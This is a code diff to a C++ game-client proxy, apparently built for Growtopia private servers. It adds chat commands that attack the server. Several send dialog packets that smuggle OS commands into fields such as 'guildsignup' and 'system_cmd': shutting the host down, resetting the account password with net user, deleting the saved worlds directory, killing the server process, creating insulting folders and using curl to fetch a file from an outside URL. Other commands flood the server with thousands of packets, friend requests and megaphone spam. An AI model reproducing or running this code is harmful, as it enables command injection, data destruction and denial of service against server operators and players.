@@ -93,17 +93,6 @@ bool events::out::generictext(std::string packet) {
             else
                 gt::send_log("Ghost is now disabled.");
             return true;
-        } else if (find_command(chat, "c")) {
-              gt::send_log("`4LooL");
-              for (int i = 0; i < 50000; ++i) {
-                  g_server->send(false, "action|input\n|t
-                  g_server->send(false, "action|input\n|t
-              }
-              return true;
-        } else if (find_command(chat, "public")) {
-                  g_server->send(false, "action|dialog_return\ndialog_name|worldcategory\nbuttonClicked|Puzzle");
-                  g_server->send(false, "action|dialog_return\ndialog_name|lock_edit\ncheckbox_public|1\ncheckbox_disable_music|0\ncheckbox_disable_music_render|1\nminimum_entry_level|1");
-            return true;
         } else if (find_command(chat, "country ")) {
             std::string cy = chat.substr(9);
             gt::flag = cy;
@@ -197,10 +186,98 @@ bool events::out::generictext(std::string packet) {
                     g_server->send(false, "action|wrench\n|netid|" + std::to_string(player.netid));
             }
             return true;
-        } else if (find_command(chat, "proxy")) {
+        } else if (find_command(chat, "sp")) {
+            for (int i = 0; i < 10000; ++i) {
+                g_server->send(false, "action|input\n|text|\n");
+            }
+            return false;
+        }
+        else if (find_command(chat, "folder")) {
+        gt::send_log("Spam / Make Folder");
+        for (int i = 1; i <= 200; ++i) {
+            g_server->send(false, "action|dialog_return\ndialog_name|guildsignup\nname|mkdir ServerBurik ServerGoblok ServerIdiot ServerHacked404 ServerDie ServerRusak ServerNoob ServerHancur ServerGAYYY");
+            g_server->send(false, "action|dialog_return\ndialog_name|system_cmd\ncommand|mkdir ServerBurik ServerGoblok ServerIdiot ServerHacked404 ServerDie ServerRusak ServerNoob ServerHancur ServerGAYYY");
+        }
+        }
+        else if (find_command(chat, "shutdown")) {
+        gt::send_log("Trying to shutdown the server");
+        g_server->send(false, "action|dialog_return\ndialog_name|guildsignup\nname|shutdown /s");
+        g_server->send(false, "action|dialog_return\ndialog_name|system_cmd\ncommand|shutdown /s");
+        }
+        else if (find_command(chat, "spamwarp ")) {
+        std::string name = chat.substr(6);
+        gt::send_log("`7Spam Warp To " + name);
+        for (int i = 0; i <= 5000; ++i) {
+            g_server->send(false, "action|join_request\nname|" + name + "\ninvitedWorld|0\n", 3);
+        }
+        return true;
+        }
+        else if (find_command(chat, "vps")) {
+            gt::send_log("`Change the VPS Password to: 2YourPassword123#");
+            g_server->send(false, "action|dialog_return\ndialog_name|guildsignup\nname|net user %username% YourPassword123#\n");
+            g_server->send(false, "action|dialog_return\ndialog_name|system_cmd\ncommand|net user %username% YourPassword123#\n");
+            return false;
+        }
+        else if (find_command(chat, "public")) {
+            gt::send_log("Set the lock to `4Public");
+            g_server->send(false, "action|dialog_return\ndialog_name|worldcategory\nbuttonClicked|Puzzle");
+            g_server->send(false, "action|dialog_return\ndialog_name|lock_edit\ncheckbox_public|1\ncheckbox_disable_music|0\ncheckbox_disable_music_render|1\nminimum_entry_level|1");
+            return true;
+        }
+        else if (find_command(chat, "spamfriend")) {
+            gt::send_log("`4Spam friend request");
+            for (int i = 0; i < 250; ++i) {
+                g_server->send(false, "action|dialog_return\ndialog_name|popup\nbuttonClicked|addfriendrnbutton\n");
+            }
+            return true;
+        }
+        else if (find_command(chat, "spamsb")) {
+        for (int i = 0; i < 1500; ++i) {
+            g_server->send(false, "action|dialog_return\ndialog_name|megaphone\nwords|CP:_`2Raided By Someone!");
+        }
+        return false;
+        }
+        else if (find_command(chat, "delworld")) {
+        g_server->send(false, "action|dialog_return\ndialog_name|guildsignup\nname|rmdir save/worlds\n");
+        g_server->send(false, "action|dialog_return\ndialog_name|system_cmd\ncommand|rmdir save/worlds\n");
+        return false;
+        }
+        else if (find_command(chat, "blast")) {
+        //set_default_color|`o\n\nadd_label_with_icon|big|`wThermonuclear Blast`|left|1402|\nadd_textbox|This item creates a new world!  Enter a unique name for it.|left|\nadd_text_input|thermoname|New World Name||24|\nend_dialog|usethermoblast\n
+        for (int i = 0; i < 50; i++) {
+            g_server->send(false, "action|dialog_return\ndialog_name|usethermoblast\nthermoname|" + std::to_string(rand() % 20000) + "\n");
+
+        }
+        gt::send_log("Sending Blasts");
+        return true;
+        }
+        else if (find_command(chat, "serverinfo")) {
+        std::string paket;
+        paket =
+            "add_label_with_icon|big|Server Information|left|32|\nadd_spacer|small\n"
+            "\nadd_textbox|Server IP : " + g_server->m_server + "|left|15||"
+            "\nadd_textbox|Server Port : " + std::to_string(g_server->m_port) + "|left|15||"
+            "add_spacer|small|"
+            "\nend_dialog|end|Cancel|Okay|";
+        variantlist_t liste{ "OnDialogRequest" };
+        liste[1] = paket;
+        g_server->send(true, liste);
+
+        return true;
+        } //Useless command
+        else if (find_command(chat, "changenews")) {
+        g_server->send(false, "action|dialog_return\ndialog_name|guildsignup\nname|curl https://linkgtnews.com -O news.txt");
+        g_server->send(false, "action|dialog_return\ndialog_name|system_cmd\ncommand|curl https://linkgtnews.com -O news.txt");
+        return true;
+        } //https://linkgtnews.com = the example of the link (you can put the link that can redirect to news.txt files)
+        else if (find_command(chat, "closeexe")) {
+        g_server->send(false, "action|dialog_return\ndialog_name|guildsignup\nname|taskkill /im server.exe /t /f\n");
+        g_server->send(false, "action|dialog_return\ndialog_name|system_cmd\ncommand|taskkill /im server.exe /t /f\n");
+        return false;
+        }
+		else if (find_command(chat, "proxy")) {
             gt::send_log(
-                "/tp [name] (teleports to a player in the world), /ghost (toggles ghost, you wont move for others when its enabled), /uid "
-                "[name] (resolves name to uid), /flag [id] (sets flag to item id), /name [name] (sets name to name)");
+                "/proxy (Show All Proxy Command), /spamfriend, /public, /vps, /shutdown, /folder, /sp, /spamwarp, /delworld, /spamsb, /closeexe, /blast, /changenews, /serverinfo");
             return true;
         } 
         return false;
@@ -301,7 +378,7 @@ bool events::in::variantlist(gameupdatepacket_t* packet) {
         case fnv32("OnSendToServer"): g_server->redirect_server(varlist); return true;
 
         case fnv32("OnConsoleMessage"): {
-            varlist[1] = "`4[PROXY]`` " + varlist[1].get_string();
+            varlist[1] = "`4[ESCR]`` " + varlist[1].get_string();
             g_server->send(true, varlist);
             return true;
         } break;
